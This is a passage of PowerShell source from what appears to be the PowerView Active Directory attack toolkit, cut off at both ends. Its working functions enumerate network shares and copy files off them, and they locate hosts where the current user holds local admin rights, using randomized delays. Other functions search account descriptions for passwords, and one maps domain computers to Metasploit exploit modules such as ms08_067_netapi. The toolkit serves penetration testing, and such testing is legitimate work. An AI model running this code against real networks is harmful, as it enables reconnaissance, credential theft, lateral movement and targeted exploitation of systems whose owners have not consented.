                    [void]$ps[$counter].AddScript($EnumShareBlock).AddParameter('Share', $Share).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)

                    # start job
                    $jobs += $ps[$counter].BeginInvoke();

                    # store wait handles for WaitForAll call
                    $wait += $jobs[$counter].AsyncWaitHandle
                }
                $counter = $counter + 1
            }
        }
        else{
            if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
                Write-Verbose "[*] Querying domain $targetDomain for hosts..."
                $Hosts = Get-NetComputers -Domain $targetDomain
            }

            # randomize the host list
            $Hosts = Get-ShuffledArray $Hosts

            foreach ($server in $Hosts){
                # make sure we get a server name
                if ($server -ne ''){
                    Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                    While ($($pool.GetAvailableRunspaces()) -le 0) {
                        Start-Sleep -milliseconds 500
                    }

                    # create a "powershell pipeline runner"
                    $ps += [powershell]::create()

                    $ps[$counter].runspacepool = $pool

                    # add the server script block + arguments
                   [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('excludedShares', $excludedShares).AddParameter('Terms', $Terms).AddParameter('ExcludeFolders', $ExcludeFolders).AddParameter('OfficeDocs', $OfficeDocs).AddParameter('ExcludeHidden', $ExcludeHidden).AddParameter('FreshEXES', $FreshEXES).AddParameter('CheckWriteAccess', $CheckWriteAccess).AddParameter('OutFile', $OutFile)

                    # start job
                    $jobs += $ps[$counter].BeginInvoke();

                    # store wait handles for WaitForAll call
                    $wait += $jobs[$counter].AsyncWaitHandle
                }
                $counter = $counter + 1
            }
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Invoke-FileDownloader {
    <#
        .SYNOPSIS
        Takes a file share list or the output of Invoke-FileFinder
        and downloads each file to the specified directory.

        Author: @harmj0y
    #>
    [cmdletbinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        $FileName,

        [String]
        $FileList,

        [String]
        $OutputFolder="Downloads"
        )

    begin {
        # if the output file isn't a full path, append the current location to it
        if(-not ($OutputFolder.Contains("\"))){
            $OutputFolder = (Get-Location).Path + "\" + $OutputFolder
        }

        # create the output folder if it doesn't exist
        $null = New-Item -Force -ItemType directory -Path $OutputFolder

        # if we are passed a share list, enumerate each with appropriate options, then return
        if($FileList){
            if (Test-Path -Path $FileList){
                foreach ($Item in Get-Content -Path $FileList) {
                    if (($Item -ne $null) -and ($Item.trim() -ne '')){
                        if (-not $((Get-Item $Item.trim()) -is [System.IO.DirectoryInfo])){
                            try {
                                $parts = ($Item.trim().trim("\")).split("\")
                                $parts[0..$($parts.Length-2)] -join "\"
                                $destinationFolder = $OutputFolder + "\" + $($parts[0..$($parts.Length-2)] -join "\")
                                if (!(Test-Path -path $destinationFolder)) {$null = New-Item $destinationFolder -Type Directory}
                                $null = Copy-Item -Path $Item.trim() -Destination $destinationFolder
                            }
                            catch {
                                Write-Warning "error: $_"
                            }
                        }
                    }
                }
            }
            else {
                Write-Warning "[!] Input file '$FileList' doesn't exist!"
                return $null
            }
            return
        }
    }

    process {
        if(-not $FileList){
            
            # if we have a FileFinder object passed, extract the file name
            if($FileName.FullName){
                $FileName = $FileName.FullName.trim()
            }
            if (-not $((Get-Item $FileName) -is [System.IO.DirectoryInfo])){
                write-verbose "filename: $filename"
                try{
                    $parts = ($FileName.trim("\")).split("\")
                    write-verbose "creating $destinationFolder"
                    $destinationFolder = $OutputFolder + "\" + $($parts[0..$($parts.Length-2)] -join "\")

                    if (!(Test-Path -path $destinationFolder)) {$null = New-Item $destinationFolder -Type Directory}
                    Write-Verbose "Copying file $FileName"
                    $null = Copy-Item -Path $FileName -Destination $destinationFolder
                }
                catch {
                    Write-Warning "error: $_"
                }
            }
        }
    }
}


function Invoke-FindLocalAdminAccess {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3

        .PARAMETER Domain
        Domain to query for machines

        .EXAMPLE
        > Invoke-FindLocalAdminAccess
        Find machines on the local domain where the current user has local
        administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Domain testing
        Find machines on the 'testing' domain where the current user has
        local administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Delay 60
        Find machines on the local domain where the current user has local administrator
        access with a 60 second (+/- *.3) randomized delay between touching each host.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -HostList hosts.txt
        Find which machines in the host list the current user has local
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [double]
        $Jitter = .3,

        [string]
        $Domain
    )

    begin {

        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # random object for delay
        $randNo = New-Object System.Random

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-FindLocalAdminAccess with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts

        if(-not $NoPing){
            $Hosts = $Hosts | Invoke-Ping
        }

        $counter = 0

        foreach ($server in $Hosts){

            $counter = $counter + 1

            Write-Verbose "[*] Enumerating server $server ($counter of $($Hosts.count))"

            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

            # check if the current user has local admin access to this server
            $access = Invoke-CheckLocalAdminAccess -HostName $server
            if ($access) {
                $ip = Get-HostIP -hostname $server
                Write-Verbose "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                $server
            }
        }
    }
}


function Invoke-FindLocalAdminAccessThreaded {
    <#
        .SYNOPSIS
        Finds machines on the local domain where the current user has
        local administrator access. Uses multithreading to
        speed up enumeration.

        Idea stolen from the local_admin_search_enum post module in
        Metasploit written by:
            'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
            'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>'
            'Royce Davis "r3dy" <rdavis[at]accuvant.com>'

        Author: @harmj0y
        License: BSD 3-Clause

        .DESCRIPTION
        This function finds the local domain name for a host using Get-NetDomain,
        queries the domain for all active machines with Get-NetComputers, then for
        each server it checks if the current user has local administrator
        access using Invoke-CheckLocalAdminAccess.

        .PARAMETER Hosts
        Host array to enumerate, passable on the pipeline.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for machines

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess
        Find machines on the local domain where the current user has local
        administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -Domain testing
        Find machines on the 'testing' domain where the current user has
        local administrator access.

        .EXAMPLE
        > Invoke-FindLocalAdminAccess -HostList hosts.txt
        Find which machines in the host list the current user has local
        administrator access.

        .LINK
        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb
        http://www.harmj0y.net/blog/penetesting/finding-local-admin-with-the-veil-framework/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String[]]
        $Hosts,

        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,

        [string]
        $Domain,

        [Int]
        $MaxThreads=10
    )

    begin {
        If ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        # get the current user
        $CurrentUser = Get-NetCurrentUser

        # random object for delay
        $randNo = New-Object System.Random

        # get the target domain
        if($Domain){
            $targetDomain = $Domain
        }
        else{
            # use the local domain
            $targetDomain = $null
        }

        Write-Verbose "[*] Running Invoke-FindLocalAdminAccessThreaded with delay of $Delay"
        if($targetDomain){
            Write-Verbose "[*] Domain: $targetDomain"
        }

        # if we're using a host list, read the targets in and add them to the target list
        if($HostList){
            if (Test-Path -Path $HostList){
                $Hosts = Get-Content -Path $HostList
            }
            else{
                Write-Warning "[!] Input file '$HostList' doesn't exist!"
                return
            }
        }
        elseif($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'"
            $Hosts = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }

        # script block that eunmerates a server
        # this is called by the multi-threading code later
        $EnumServerBlock = {
            param($Server, $Ping, $CurrentUser)

            $up = $true
            if($Ping){
                $up = Test-Server -Server $server
            }
            if($up){
                # check if the current user has local admin access to this server
                $access = Invoke-CheckLocalAdminAccess -HostName $server
                if ($access) {
                    $ip = Get-HostIP -hostname $server
                    Write-Verbose "[+] Current user '$CurrentUser' has local admin access on $server ($ip)"
                    $server
                }
            }
        }

        # Adapted from:
        #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        # grab all the current variables for this runspace
        $MyVars = Get-Variable -Scope 1

        # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
        $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

        # Add Variables from Parent Scope (current runspace) into the InitialSessionState
        ForEach($Var in $MyVars) {
            If($VorbiddenVars -notcontains $Var.Name) {
            $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
            }
        }

        # Add Functions from current runspace to the InitialSessionState
        ForEach($Function in (Get-ChildItem Function:)) {
            $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
        }

        # threading adapted from
        # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
        # Thanks Carlos!
        $counter = 0

        # create a pool of maxThread runspaces
        $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
        $pool.Open()

        $jobs = @()
        $ps = @()
        $wait = @()

        $counter = 0
    }

    process {

        if ( (-not ($Hosts)) -or ($Hosts.length -eq 0)) {
            Write-Verbose "[*] Querying domain $targetDomain for hosts..."
            $Hosts = Get-NetComputers -Domain $targetDomain
        }

        # randomize the host list
        $Hosts = Get-ShuffledArray $Hosts
        $HostCount = $Hosts.Count
        Write-Verbose "[*] Total number of hosts: $HostCount"

        foreach ($server in $Hosts){
            # make sure we get a server name
            if ($server -ne ''){
                Write-Verbose "[*] Enumerating server $server ($($counter+1) of $($Hosts.count))"

                While ($($pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -milliseconds 500
                }

                # create a "powershell pipeline runner"
                $ps += [powershell]::create()

                $ps[$counter].runspacepool = $pool

                # add the script block + arguments
                [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing).AddParameter('CurrentUser', $CurrentUser)

                # start job
                $jobs += $ps[$counter].BeginInvoke();

                # store wait handles for WaitForAll call
                $wait += $jobs[$counter].AsyncWaitHandle
            }
            $counter = $counter + 1
        }
    }

    end {
        Write-Verbose "Waiting for scanning threads to finish..."

        $waitTimeout = Get-Date

        while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
                Start-Sleep -milliseconds 500
            }

        # end async call
        for ($y = 0; $y -lt $counter; $y++) {

            try {
                # complete async job
                $ps[$y].EndInvoke($jobs[$y])

            } catch {
                Write-Warning "error: $_"
            }
            finally {
                $ps[$y].Dispose()
            }
        }

        $pool.Dispose()
    }
}


function Invoke-UserFieldSearch {
    <#
        .SYNOPSIS
        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .DESCRIPTION
        This function queries all users in the domain with Get-NetUser,
        extracts all the specified field(s) and searches for a given
        term, default "*pass*". Case is ignored.

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Term
        Term to search for, default of "pass"

        .PARAMETER Domain
        Domain to search user fields for.

        .EXAMPLE
        > Invoke-UserFieldSearch
        Find user accounts with "pass" in the description.

        .EXAMPLE
        > Invoke-UserFieldSearch -Field info -Term backup
        Find user accounts with "backup" in the "info" field.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',

        [string]
        $Term = 'pass',

        [string]
        $Domain
    )

    Get-NetUser -Domain $Domain | % {
        try {
            $desc = $_.$Field
            if ($desc){
                $desc = $desc.ToString().ToLower()
            }
            if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ) {
                $out = new-object psobject
                $out | add-member Noteproperty 'User' $_.samaccountname
                $out | add-member Noteproperty $Field $desc
                $out
            }
        }
        catch {}
    }
}


function Invoke-ComputerFieldSearch {
    <#
        .SYNOPSIS
        Searches computer object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        .PARAMETER Field
        User field to search in, default of "description".

        .PARAMETER Term
        Term to search for, default of "pass".

        .PARAMETER Domain
        Domain to search computer fields for.

        .EXAMPLE
        > Invoke-ComputerFieldSearch
        Find computer accounts with "pass" in the description.

        .EXAMPLE
        > Invoke-ComputerFieldSearch -Field info -Term backup
        Find computer accounts with "backup" in the "info" field.
    #>

    [CmdletBinding()]
    param(
        [string]
        $Field = 'description',

        [string]
        $Term = 'pass',

        [string]
        $Domain
    )


    Get-NetComputers -Domain $Domain -FullData | % {
        try {
            $desc = $_.$Field
            if ($desc){
                $desc = $desc.ToString().ToLower()
            }
            if ( ($desc -ne $null) -and ($desc.Contains($Term.ToLower())) ) {
                $out = new-object psobject
                $out | add-member Noteproperty 'Name' $_.name
                $out | add-member Noteproperty $Field $desc
                $out
            }
        }
        catch {}
    }
}


function Get-ExploitableSystems
{
    <#
        .Synopsis
           This module will query Active Directory for the hostname, OS version, and service pack level  
           for each computer account.  That information is then cross-referenced against a list of common
           Metasploit exploits that can be used during penetration testing.
        .DESCRIPTION
           This module will query Active Directory for the hostname, OS version, and service pack level  
           for each computer account.  That information is then cross-referenced against a list of common
           Metasploit exploits that can be used during penetration testing.  The script filters out disabled
           domain computers and provides the computer's last logon time to help determine if it's been 
           decommissioned.  Also, since the script uses data tables to output affected systems the results
           can be easily piped to other commands such as test-connection or a Export-Csv.
        .EXAMPLE
           The example below shows the standard command usage.  Disabled system are excluded by default, but
           the "LastLgon" column can be used to determine which systems are live.  Usually, if a system hasn't 
           logged on for two or more weeks it's been decommissioned.      
           PS C:\> Get-ExploitableSystems -DomainController 192.168.1.1 -Credential demo.com\user | Format-Table -AutoSize
           [*] Grabbing computer accounts from Active Directory...
           [*] Loading exploit list for critical missing patches...
           [*] Checking computers for vulnerable OS and SP levels...
           [+] Found 5 potentially vulnerabile systems!
           ComputerName          OperatingSystem         ServicePack    LastLogon            MsfModule                                      CVE                      
           ------------          ---------------         -----------    ---------            ---------                                      ---                      
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           ADS.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 5:46:52 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           LVA.demo.com          Windows Server 2003     Service Pack 2 4/8/2015 1:44:46 PM  exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           assess-xppro.demo.com Windows XP Professional Service Pack 3 4/1/2014 11:11:54 AM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           HVA.demo.com          Windows Server 2003     Service Pack 2 11/5/2013 9:16:31 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/dcerpc/ms07_029_msdns_zonename http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms08_067_netapi            http://www.cvedetails....
           DB1.demo.com          Windows Server 2003     Service Pack 2 3/22/2012 5:05:34 PM exploit/windows/smb/ms10_061_spoolss           http://www.cvedetails....                     
        .EXAMPLE
           The example below shows how to write the output to a csv file.
           PS C:\> Get-ExploitableSystems -DomainController 192.168.1.1 -Credential demo.com\user | Export-Csv c:\temp\output.csv -NoTypeInformation
        .EXAMPLE
           The example below shows how to pipe the resultant list of computer names into the test-connection to determine if they response to ping
           requests.
           PS C:\> Get-ExploitableSystems -DomainController 192.168.1.1 -Credential demo.com\user | Test-Connection
         .LINK
           http://www.netspi.com
           https://github.com/nullbind/Powershellery/blob/master/Stable-ish/ADS/Get-ExploitableSystems.psm1
           
         .NOTES
           Author: Scott Sutherland - 2015, NetSPI
           Version: Get-ExploitableSystems.psm1 v1.0
           Comments: The technique used to query LDAP was based on the "Get-AuditDSComputerAccount" 
           function found in Carols Perez's PoshSec-Mod project.  The general idea is based off of  
           Will Schroeder's "Invoke-FindVulnSystems" function from the PowerView toolkit.
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {
        # Status user
        Write-Verbose "[*] Grabbing computer accounts from Active Directory..."

        # Create data table for hostnames, os, and service packs from LDAP
        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null        
        $TableAdsComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableAdsComputers.Columns.Add('ServicePack') | Out-Null
        $TableAdsComputers.Columns.Add('LastLogon') | Out-Null

        # ----------------------------------------------------------------
        # Grab computer account information from Active Directory via LDAP
        # ----------------------------------------------------------------
        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {

            # Setup fields
            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentOs = $($_.properties['operatingsystem'])
            $CurrentSp = $($_.properties['operatingsystemservicepack'])
            $CurrentLast = $($_.properties['lastlogon'])
            $CurrentUac = $($_.properties['useraccountcontrol'])

            # Convert useraccountcontrol to binary so flags can be checked
            # http://support.microsoft.com/en-us/kb/305144
            # http://blogs.technet.com/b/askpfeplat/archive/2014/01/15/understanding-the-useraccountcontrol-attribute-in-active-directory.aspx
            $CurrentUacBin = [convert]::ToString($CurrentUac,2)

            # Check the 2nd to last value to determine if its disabled
            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)

            # Add computer to list if it's enabled
            if ($CurrentDisabled  -eq 0){
                # Add domain computer to data table
                $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast) | Out-Null 
            }            

         }

        # Status user        
        Write-Verbose "[*] Loading exploit list for critical missing patches..."

        # ----------------------------------------------------------------
        # Setup data table for list of msf exploits
        # ----------------------------------------------------------------
    
        # Create data table for list of patches levels with a MSF exploit
        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add('OperatingSystem') | Out-Null 
        $TableExploits.Columns.Add('ServicePack') | Out-Null
        $TableExploits.Columns.Add('MsfModule') | Out-Null  
        $TableExploits.Columns.Add('CVE') | Out-Null
        
        # Add exploits to data table
        $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
